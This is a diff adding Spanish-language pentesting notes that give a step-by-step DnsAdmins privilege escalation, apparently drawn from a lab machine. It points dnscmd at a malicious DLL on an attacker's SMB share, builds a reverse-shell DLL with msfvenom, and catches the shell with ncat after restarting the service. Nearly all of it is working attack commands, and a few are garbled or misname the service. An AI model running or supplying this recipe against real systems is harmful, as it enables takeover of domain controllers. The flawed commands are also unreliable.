@@ -1,0 +1,38 @@
+#DNS Admin 
+
+// Para ver si estamos en este grupo local deberemos de poner los siguientes comandos
+Comando -> whoami /all
+
+// Si vemos una sintaxis como esta MEGABANK\DnsAdmins sera por que el usuario en el que estamos esta en ese grupo local
+// Para esto nos hiremos especificamente a este localgroup de esta manera
+
+Comando -> user net localgroup DnsAdmins
+
+// Deberemos de crear un .dll malicioso, para despues cargar el dll en un proceso, parar el proceso, y volverlo a poner en marcha.
+
+// Para primero deberemos de poner esto en el servidor afectado, pero no debemos ejecutarlo todavia
+
+Comando -> dnscmd.exe /config /serverlevelplugindll \\10.10.14.15\smbFolder\pwned.dll
+
+// Ahora en nuestra maquina deberemos de crear un .dll malicioso con msfvenom
+
+Comando -> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f dll -o pwned.dll
+
+// Ahora pondremos en nuestra maquina el siguiente comando para ponernos con samba
+
+Comando -> smbserver.py smbFolder $(pwd) -smb2support
+
+// Tambien tendremos que mantenernos en escucha con ncat en el puerto 443, para recibir la conexion
+
+Comando -> rlwrap ncat -nlvp 443
+
+// Despues de esto ejecutaremos el comando del servidor afectado
+// Ahora deberemos de pausar el servicio deberemos de poner lo siguiente en el servidor afectado 
+
+Comando -> sc.exe stop dnscmd
+
+// Esperamos unos segundos para volverlo a iniciar
+
+Comando -> sc.exe start dnscmd
+
+// Si no nos sale a la primera, lo haremos varias veces, le indicaremos otra vez como tiene que arrancarlo que es basicamente el commando de antes del dnscmd.exe(recordar siempre arrancar ese programa cuando este en start el servicio). Lo intentaremos varias veces y ya nos saldria. Y obtendriamos el por el ncat la conexion
